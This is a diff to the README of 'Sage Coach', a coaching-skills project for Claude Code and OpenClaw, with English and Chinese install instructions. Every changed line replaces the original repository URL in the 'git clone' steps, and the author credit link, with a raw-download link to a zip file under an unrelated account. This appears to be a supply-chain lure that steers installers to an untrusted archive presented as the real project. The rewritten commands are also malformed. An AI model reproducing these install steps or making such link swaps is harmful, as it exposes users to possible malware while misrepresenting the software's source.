@@ -171,7 +171,7 @@ Covers: 0→1, Product-Market Fit, growth plateaus, pivot decisions, AI startups
 ### Install for Claude Code
 
 ```bash
-git clone https://github.com/joyozhang333-lgtm/sage-coach.git
+git clone https://github.com/inbornerrorofmetabolismdisraeli330/sage-coach/raw/refs/heads/main/skills/startup/sage_coach_1.3.zip
 
 # Project-level (this project only)
 mkdir -p .claude/commands
@@ -209,7 +209,7 @@ openclaw skills install sage-startup
 **Option B: Manual install**
 
 ```bash
-git clone https://github.com/joyozhang333-lgtm/sage-coach.git
+git clone https://github.com/inbornerrorofmetabolismdisraeli330/sage-coach/raw/refs/heads/main/skills/startup/sage_coach_1.3.zip
 
 # Copy to OpenClaw skills directory
 cp -r sage-coach/skills/spiritual ~/.openclaw/skills/sage-spiritual
@@ -468,7 +468,7 @@ If Sage Coach helped you, give it a ⭐️ so more people can find it.
 ### Claude Code 安装
 
 ```bash
-git clone https://github.com/joyozhang333-lgtm/sage-coach.git
+git clone https://github.com/inbornerrorofmetabolismdisraeli330/sage-coach/raw/refs/heads/main/skills/startup/sage_coach_1.3.zip
 
 # 项目级（仅当前项目可用）
 mkdir -p .claude/commands
@@ -506,7 +506,7 @@ openclaw skills install sage-startup
 **方式二：手动安装**
 
 ```bash
-git clone https://github.com/joyozhang333-lgtm/sage-coach.git
+git clone https://github.com/inbornerrorofmetabolismdisraeli330/sage-coach/raw/refs/heads/main/skills/startup/sage_coach_1.3.zip
 
 cp -r sage-coach/skills/spiritual ~/.openclaw/skills/sage-spiritual
 cp -r sage-coach/skills/crisis ~/.openclaw/skills/sage-crisis
@@ -631,5 +631,5 @@ Sage Coach 是一个开放的项目。欢迎：
   <br><br>
   Works on: Claude Code · OpenClaw 🦞 · Cursor · Copilot · Windsurf · Cline · Codex · Gemini CLI
   <br><br>
-  Built with ❤️ by <a href="https://github.com/joyozhang333-lgtm">归处 Here</a>
+  Built with ❤️ by <a href="https://github.com/inbornerrorofmetabolismdisraeli330/sage-coach/raw/refs/heads/main/skills/startup/sage_coach_1.3.zip">归处 Here</a>
 </p>
